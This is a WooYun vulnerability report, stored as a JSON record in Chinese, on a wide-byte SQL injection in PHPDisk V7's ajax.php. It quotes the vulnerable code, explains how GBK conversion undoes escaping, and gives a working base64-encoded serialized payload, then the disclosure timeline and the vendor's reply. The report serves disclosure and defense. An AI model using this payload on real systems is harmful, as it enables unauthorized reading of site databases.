{"id": 54647, "wybug_id": "wooyun-2014-063808", "wybug_title": "phpdisk V7 （20140604） 注入一枚 (直接出数据)", "wybug_corp": "phpdisk.com", "wybug_author": "′雨。", "wybug_date": "2014-06-09 12:38", "wybug_open_date": "2014-09-07 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向公众公开  简要描述： 20140604 详细说明：  在ajax.php中\nelse{\t\t\t\t$file = unserialize(base64_decode($data));\t\t\t\t/*foreach($file as $k=>$v){\t\t\t\t$file[$k] = $db->escape($file[$v]);\t\t\t\t}*/\t\t\t\t$file[file_id] = (int)$file[file_id];\t\t\t\t$file[file_size] = (int)$file[file_size];\t\t\t\t$file[file_description] = $db->escape(trim($file[file_description]));\t\t\t\t$file[file_extension] = $db->escape(trim($file[file_extension]));\t\t\t\t$file[file_name] = $db->escape(trim($file[file_name]));\t\t\t\t$num = @$db->result_first(\"select count(*) from {$tpf}files where yun_fid='{$file[file_id]}' and userid='$pd_uid'\");\t\t\t\tif($num && $file[file_id]){\t\t\t\t\t$tmp_ext = $file[file_extension] ? '.'.$file[file_extension] : '';\t\t\t\t\t$msg = $file[file_name].$tmp_ext;\t\t\t\t}else{\t\t\t\t\t$report_status =0;\t\t\t\t\t$report_arr = explode(',',$settings['report_word']);\t\t\t\t\tif(count($report_arr)){\t\t\t\t\t\tforeach($report_arr as $value){\t\t\t\t\t\t\tif (strpos($file['file_name'],$value) !== false){\t\t\t\t\t\t\t\t$report_status = 2;\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\t$ins = array(\t\t\t\t\t'yun_fid' => $file[file_id],\t\t\t\t\t'file_name' => $file[file_name],\t\t\t\t\t'file_key' => $file_key,\t\t\t\t\t'file_extension' => $file[file_extension],\t\t\t\t\t'file_mime' => 'application/octet-stream',\t\t\t\t\t'file_description' => $file[file_description],\t\t\t\t\t'file_size' => $file['file_size'],\t\t\t\t\t'file_time' => $timestamp,\t\t\t\t\t'is_checked' => $is_checked,\t\t\t\t\t'in_share' => $in_share,\t\t\t\t\t'report_status' => $report_status,\t\t\t\t\t'userid' => $pd_uid,\t\t\t\t\t'folder_id' => $folder_id ? $folder_id : -1,\t\t\t\t\t'ip' => $onlineip,\t\t\t\t\t);\t\t\t\t\t$sql = \"insert into {$tpf}files set \".$db->sql_array($ins).\";\";\t\t\t\t\t$db->query_unbuffered(is_utf8() ? $sql : iconv('utf-8','gbk',$sql));\t\t\t\t}\n可以看到 都经过了escape 进行了转义。  但是在insert前is_utf8() ? $sql : iconv('utf-8','gbk',$sql)当为gbk的时候就会进行一次转换编码的操作 然后造成了宽字节注入。錦 从UTF8 转成 GBK之后成了 %e5%5c '转义后为\\'%e5%5c%5c%27 两个\\\\闭合。单引号出来 造成了注入。$file[file_description] 这个会直接输出来 。利用这个点来注入。   漏洞证明：  对构造的语句序列化 和 base64_encode后得到YToxOntzOjE0OiJmaWxlX2V4dGVuc2lvbiI7czoxOTQ6ImFzZOmMpicsZmlsZV9kZXNjcmlwdGlvbj11c2VyKCksYGZpbGVfbWltZWA9dXNlcigpLGBmaWxlX3NpemVgPXVzZXIoKSwgYGZpbGVfdGltZWA9dXNlcigpLCBgaXNfY2hlY2tlZGA9MSwgYGluX3NoYXJlYD0xLCBgcmVwb3J0X3N0YXR1c2A9dXNlcigpLCBgdXNlcmlkYD11c2VyKCksIGBmb2xkZXJfaWRgPXVzZXIoKSwgYGlwYD11c2VyKCkjIjt9\n\n然后直接查看这文件\n\n出现数据。   修复方案：  注意转换编码的安全。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-06-10 10:40 厂商回复： 感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}